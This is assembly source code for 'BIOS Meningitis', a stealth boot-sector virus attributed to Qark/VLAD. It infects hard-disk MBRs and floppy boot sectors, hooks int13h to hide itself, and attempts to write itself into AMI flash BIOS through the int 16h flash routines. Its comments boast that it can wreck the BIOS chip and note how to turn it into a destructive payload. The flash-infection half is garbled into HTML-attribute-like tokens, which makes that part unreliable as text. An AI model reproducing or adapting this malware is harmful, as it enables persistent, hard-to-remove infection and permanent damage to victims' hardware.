

;.........................................................................
;
;                    -=[ BIOS Meningitis ]=-
;                                               Qark/VLAD
;
;
;  Basic boot sector virus with a twist.
;
;  The worlds first flash BIOS infecting virus!
;
;  I _just_ fit all this into 512 bytes.  Infact there is only four bytes
;  spare... there wasn't even enough room for the name!  It used to copy
;  the partition table to the end of the virus but that is 64 bytes that 
;  just couldn't spared, so now you if you boot from a floppy disk, the 
;  hard disk won't be accessible.  But it's a full stealth virus apart
;  from that.
;
;  If you have flash BIOS on your computer there is a chance it will fuck 
;  it up!  I'm talking wiped BIOS chip type fucked!  You WONT be able to
;  remove this virus!!!
;
;  The results of any tests of this with flash BIOS would be appreciated.
;
;  Assemble with A86 as always.
;
;.........................................................................


;On entry to the boot sector DL=Drive booted from.

	org     0        
	
	mov     si,7c00h
	
	xor     ax,ax
	mov     es,ax

	cli
	mov     ss,ax                   ;Setup the stack
	mov     sp,si
	sti

	mov     ds,ax                   ;DS,CS,ES,SS=0

;***    40:[13] -       memory in k's   -  reduce by one or so          ***

	dec     word ptr [413h]         ;0:413 = Memory in K,  Sub one K.
	
	int     12h                     ;Get memory into AX
					;Since memory is in K we have to
					;multiply by 1024.  To do that we 
					;would SHL AX,10.  But because we are
					;looking for the segment that takes
					;4 bits off the equation.

	mov     cl,6
	shl     ax,cl                   ;Thus SHL AX,6
	mov     es,ax                   ;ES = Virus Segment


;***    read virus sector into TOM  (top of memory)     ***

	xor     di,di
	mov     cx,200h
	cld
	rep     movsb                   ;Move virus to ES:0

	mov     ax,word ptr [13h*4]     ;Get int13h from vector table.
	mov     word ptr es:[offset i13],ax
	mov     ax,word ptr [13h*4+2]
	mov     word ptr es:[offset i13+2],ax

	mov     word ptr [13h*4],offset handler
	mov     word ptr [13h*4+2],es

already_resident:

	push    es
	mov     ax,offset restart
	push    ax
	retf

Restart:
	;Load the original bootsector from the end of the root directory and
	;execute it.
	xor     ax,ax
	call    int13h

	xor     ax,ax
	mov     es,ax
	mov     bx,7c00h                ;Where it's meant to be.

	mov     cx,2                    ;Read HD boot strap from MBR.
	xor     dh,dh
	mov     ax,201h                 ;Read one sector from root directory.
	cmp     dl,80h
	jae     MBR_Loader
	;load up floppy
	mov     cl,14                   ;Cylinder=0, Sector=14
	mov     dh,1                    ;Head=1

MBR_Loader:
	call    int13h

	push    dx                      ;DL=Drive we are at.

	cmp     byte ptr cs:flash_done,1   ;flash is already infected.
	je      flash_resident

	call    flash_BIOS              ;Infect flash BIOS if any.

Flash_resident:

	pop     dx

	db      0eah                    ;JMPF   0000:7C00H
	dw      7c00h
	dw      0
	
Stealth:

	mov     cx,2
	mov     ax,201h
	cmp     dl,80h
	jae     hd_stealth
	mov     cl,14
	mov     dh,1
hd_stealth:
	call    int13h
	jmp     pop_exit
res_test:
	xchg    ah,al
	iret
Handler:
	cmp     ax,0abbah
	je      res_test
	cmp     ah,2            ;Reading the first sector ?
	jne     jend
	cmp     cx,1
	jne     jend
	cmp     dh,0
	jne     jend

try_infect:

	call    int13h
	jc      jend

	pushf
	push    ax
	push    bx
	push    cx
	push    dx
	push    si
	push    di
	push    es
	push    ds
	
	;Test if already infected.

	cmp     word ptr es:[bx + offset marker],'LV'
	je      stealth                 ;Already infected.

	cmp     dl,80h                  ;C:
	jb      infect_floppy
	
	mov     cx,2                    ;Sector 2 - Empty MBR space.
	xor     dh,dh
	jmp     write_virus
	
Infect_Floppy:
	;Store at end of root directory for floppy drives.
	;(Will fuck up on 360k but I dont give a shit!)

	mov     cx,14                   ;Cylinder=0, Sector=14
	mov     dh,1                    ;Head=1

Write_Virus:        
	;Write original boot sector to spare room.

	mov     ax,301h
	call    int13h
	jc      pop_exit

	;The virus is written at this point.
	
	push    cs
	pop     es
	
	mov     byte ptr cs:flash_done,0

	xor     bx,bx
	mov     ax,301h                 ;Write virus.
	mov     cx,1
	xor     dh,dh
	call    int13h

Pop_Exit:
	pop     ds
	pop     es
	pop     di
	pop     si
	pop     dx
	pop     cx
	pop     bx
	pop     ax
	popf

	retf    2

jend:        
	db      0eah                    ;Stands for Jmpf
	i13     dd      0               ;The original int13h


Int13h  proc    near

	pushf
	call    dword ptr cs:[i13]
	ret

Int13h  endp
	
Marker  db   'VLAD'                     ;Running out of room so small
					;marker.


Flash_BIOS      Proc    Near

;               Flash BIOS infection (c) 1994 Qark/VLAD!

;Disclaimer: If any of this wrecks your computer that's your bad luck
;because you know this is dangerous code.

;I just hope that AMIFLASH is loaded at boot and isn't a driver.  Since it's
;written by a BIOS maker you'd think so...


	mov     ax,0e000h               ;Get flash BIOS number.
	int     16h                     ;Test for its presence.
	jc      no_flash_bios
	cmp     al,0fah                 ;<-- gotta="" test="" this="" jne="" no_flash_bios="" infect_flash:="" ;we="" are="" now="" working="" with="" amiflash!="" ;first="" we'll="" find="" a="" nice="" place="" to="" store="" our="" virus.="" ;="" we'll="" scan="" between="" f000-ffff="" where="" bios="" is="" normally="" stored="" for="" ;="" a="" 1k="" chunk="" of="" consecutive="" zeros.="" (we="" might="" only="" need="" half="" a="" k="" ;="" but="" i'm="" overplanning)="" mov="" ax,0f000h="" ;rom="" bios="" segment="" mov="" ds,ax="" new_segment:="" xor="" si,si="" xor="" dx,dx="" ok_new_segment:="" inc="" ax="" mov="" ds,ax="" cmp="" ax,0fff0h="" ;no="" room="" for="" our="" virus.="" je="" no_flash_bios="" test16:="" cmp="" word="" ptr="" [si],0="" ;scan="" words="" jne="" new_segment="" inc="" dx="" ;dx="" is="" our="" free="" room="" counter.="" cmp="" dx,512="" ;1024="" byte="" buffer="" found="" (512x2)="" je="" found_storage="" inc="" si="" inc="" si="" ;coz="" we="" are="" messing="" with="" words.="" cmp="" si,16="" ;we="" are="" going="" up="" in="" paragraphs.="" je="" ok_new_segment="" jmp="" test16="" found_storage:="" sub="" ax,40h="" ;sub="" 1k="" (40hx16="1024)" mov="" ds,ax="" ;coz="" we="" are="" using="" segments="" mov="" ax,0e001h="" ;chipset="" save="" requirement.="" int="" 16h="" ;bx="Number" of="" bytes="" to="" save="" chipset.="" cmp="" bx,512="" jbe="" save_chipset="" ;we="" won't="" bother="" saving="" the="" chipset="" because="" it="" takes="" up="" more="" room="" ;than="" our="" virus="" buffer="" can="" store.="" fuck="" em="" :)="" mov="" byte="" ptr="" cs:chipset,1="" ;indicate="" we="" haven't="" saved="" anything.="" jmp="" write_enable="" no_flash_bios:="" ret="" save_chipset:="" mov="" byte="" ptr="" cs:chipset,0="" ;we've="" saved="" stuff.="" mov="" al,2="" push="" cs="" pop="" es="" ;es="CS" mov="" di,offset="" buffer="" int="" 16h="" ;chipset="" status="" to="" es:di="" write_enable:="" mov="" al,5="" int="" 16h="" ;raise="" voltage="" (this="" may="" take="" time).="" mov="" al,7="" ;flash="" write="" enable.="" int="" 16h="" ;flash="" memory="" is="" now="" writable.="" i="" am="" working="" on="" nothing="" here="" ;so="" i'll="" assume="" you="" just="" write="" to="" it="" normally="" and="" it'll="" be="" ;put="" there.="" if="" you="" were="" into="" writing="" destructive="" payloads="" ;this="" would="" be="" the="" mother="" of="" them="" all.="" just="" load="" cx="" with="" 0ffffh="" ;to="" trash="" their="" computer.="" also,="" leaving="" the="" computer="" in="" this="" ;state="" for="" extended="" periods="" could="" cause="" damage="" (dunno="" their="" ;electricity="" bill="" would="" go="" up="" at="" least="" :)="" push="" ds="" pop="" es="" ;ds="ES=Place" to="" put="" virus.="" xor="" di,di="" mov="" cx,512=""></--><-- ffff="trouble!" push="" cs="" pop="" ds="" ;ds="CS" xor="" si,si="" cld="" rep="" movsb="" ;move="" our="" virus="" into="" bios.="" ;hopefully="" our="" virus="" is="" written="" ;ok,="" i="" looked="" into="" this="" carefully.="" at="" bootup="" int19h="" points="" ;into="" the="" bios="" but="" thereafter="" is="" grabbed="" by="" various="" programs="" ;(dunno="" why,="" its="" the="" shittiest="" interrupt="" out).="" so,="" if="" you="" debug="" ;right="" now="" it'll="" point="" into="" some="" shadowed="" area="" or="" else="" into="" ;segment="" 70h,="" but="" it="" won't="" at="" bootup="" which="" is="" the="" only="" time="" boot="" ;sector="" viruses="" get="" executed="" so="" all="" is="" cool.="" ;what="" we'll="" do="" is="" modify="" the="" actual="" bytes="" at="" the="" entry="" point="" to="" ;the="" interrupt.="" you="" might="" think="" i="" should="" do="" something="" else="" but="" ;i="" can't="" think="" of="" any="" other="" way="" of="" hooking="" an="" interrupt="" at="" bootup.="" ;priest-p/s="" reckoned="" i="" should="" just="" store="" my="" virus="" in="" the="" flash="" ;and="" let="" the="" bootvirus="" just="" jump="" to="" it="" or="" something="" but="" then="" ;it's="" not="" really="" infected="" methinks.="" he="" also="" suggested="" i="" just="" modify="" ;the="" int13h="" entry="" point="" and="" restore="" the="" bytes="" etc.="" well="" as="" you="" can="" ;see="" from="" the="" involved="" code="" needed="" just="" to="" write="" to="" flash="" i="" think="" ;that="" with="" a="" common="" interrupt="" like="" int13h="" it="" isn't="" feasible.="" ;get="" segment:offset="" of="" original="" int19handler="" mov="" bx,es="" ;bx="Virus" segment="" xor="" ax,ax="" mov="" ds,ax="" ;ds="Vector" table.="" mov="" di,word="" ptr="" [19h*4]="" ;offset="" of="" int19h="" mov="" es,word="" ptr="" [19h*4+2]="" ;segment="" of="" 19h="" ;write="" a="" jmp="" far="" at="" the="" int19h="" entry="" point.="" mov="" al,0eah="" stosb="" mov="" ax,offset="" int19handler="" stosw="" mov="" ax,bx="" stosw="" ;creates="" a="" jmpf="" int19handler="" at="" the="" ;int19h="" entry="" point.="" mov="" ax,0e004h="" ;lower="" voltage.="" int="" 16h="" mov="" al,6="" ;write="" protect.="" int="" 16h="" cmp="" byte="" ptr="" cs:chipset,0="" jne="" no_flash_bios="" ;we've="" done="" for="" this="" one.="" push="" cs="" pop="" es="" ;es="CS" mov="" al,3="" mov="" di,offset="" buffer="" ;restore="" all="" their="" shit.="" int="" 16h="" jmp="" no_flash_bios="" chipset="" db="" 0="" ;1="chipset" not="" saved="" flash_done="" db="" 0="" ;1="loaded" from="" flash.="" ;this="" is="" our="" own="" int19h="" handler.="" the="" original="" sux="" because="" it="" isn't="" infected.="" ;(strange="" logic="" :)="" int19handler="" proc="" near="" xor="" ax,ax="" mov="" es,ax="" ;es="0" mov="" ax,0abbah="" ;abba="" -="" from="" muriels="" wedding.="" int="" 13h="" cmp="" ax,0baabh="" ;baab="" -="" i="" like="" these.="" jne="" real_int19h="" ;we="" are="" currently="" before="" the="" boot="" here.="" lets="" install="" our="" virus="" before="" ;any="" boot="" sectors="" or="" anything="" get="" loaded.="" push="" cs="" ;ds="0" pop="" ds="" cld="" xor="" si,si="" mov="" di,7c00h="" mov="" cx,512="" rep="" movsb="" ;move="" our="" virus="" from="" bios="" into="" boot="" buffer.="" mov="" dl,80h="" ;make="" it="" think="" its="" c:="" jmp="" goto_buffer="" ;execute="" it.="" real_int19h:="" xor="" ax,ax="" int="" 13h="" ;reset="" disk="" mov="" cx,1="" mov="" dh,0="" mov="" ax,201h="" mov="" bx,7c00h="" cmp="" dl,0="" ja="" hd_int19h="" int="" 13h="" ;read="" boot="" sector.="" jc="" fix_hd="" goto_buffer:="" mov="" byte="" ptr="" es:[7c00h+offset="" flash_done],1="" db="" 0eah="" ;jmpf="" 0000:7c00="" dw="" 7c00h="" dw="" 0="" fix_hd:="" mov="" dl,80h="" ;boot="" from="" c:="" hd_int19h:="" xor="" ax,ax="" int="" 13h="" ;reset="" controller.="" mov="" ax,201h="" int="" 13h="" jc="" fucked_boot="" jmp="" goto_buffer="" fucked_boot:="" int="" 18h="" ;called="" when="" a="" boot="" fucks="" up="" int19handler="" endp="" flash_bios="" endp="" end_virus:="" dupsize="" equ="" 510="" -="" offset="" end_virus="" db="" dupsize="" dup="" (0)="" db="" 55h,0aah="" ;end="" of="" sector="" marker.="" buffer:="" ;512="" bytes="" of="" storage="" space="" in="" here.=""></-->